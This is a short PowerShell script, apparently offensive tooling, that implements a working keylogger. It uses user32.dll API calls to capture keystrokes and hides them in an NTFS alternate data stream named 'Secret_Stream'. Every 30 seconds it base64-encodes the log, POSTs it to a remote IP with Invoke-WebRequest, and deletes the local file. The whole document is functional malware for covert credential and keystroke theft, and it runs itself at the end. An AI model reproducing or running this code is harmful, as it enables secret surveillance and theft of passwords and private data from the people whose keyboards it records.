function Start-KeyLogger {
    Param (
        $IP = "10.10.10.10",
        $OutputFile = "C:\keylogger.txt"
    )
    $APIs = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    # Load function calls and define them
    $API = Add-Type -MemberDefinition $APIs -Name 'Win32' -Namespace API -PassThru

    try {
        Write-Host "KeyLogger initiated.  Press CTRL+C to quit and show recorded keystrokes." -ForegroundColor Green
        
        $stopWatch = [Diagnostics.Stopwatch]::StartNew()
        while($true) {
            Start-Sleep -Milliseconds 40

            for($ascii = 9; $ascii -le 254; $ascii++) {
                $state = $API::GetAsyncKeyState($ascii)

                if($state -eq -32767) {
                    [console]::CapsLock | Out-Null

                    $VirtualKey = $API::MapVirtualKey($ascii, 3)

                    $KBState = New-Object Byte[] 256
                    $CheckKBState = $API::GetKeyboardState($KBState)

                    $char = New-Object -TypeName System.Text.StringBuilder

                    $success = $API::ToUnicode($ascii, $VirtualKey, $KBState, $char, $char.Capacity, 0)

                    if($success) {
                        #[System.IO.File]::AppendAllText($OutputFile, $char, [System.Text.Encoding]::Unicode)
                        Add-Content -Path $OutputFile -Value $char -Stream 'Secret_Stream' -NoNewline
                    }
                }
            }

            if($stopWatch.Elapsed.Seconds -ge 30) {
                $content = Get-Content -Path 'C:\keylogger.txt' -Stream 'Secret_Stream'
                $contantBytes = [System.Text.Encoding]::UTF8.GetBytes($content)
                $base64Content = [System.Convert]::ToBase64String($contantBytes)
                
                Invoke-WebRequest -Uri "http://$IP/" -Method POST -Body $base64Content

                Remove-Item -Path 'C:\keylogger.txt'
                $stopWatch = [Diagnostics.Stopwatch]::StartNew()
            }
        }
    }
    catch {}
}

Start-KeyLogger
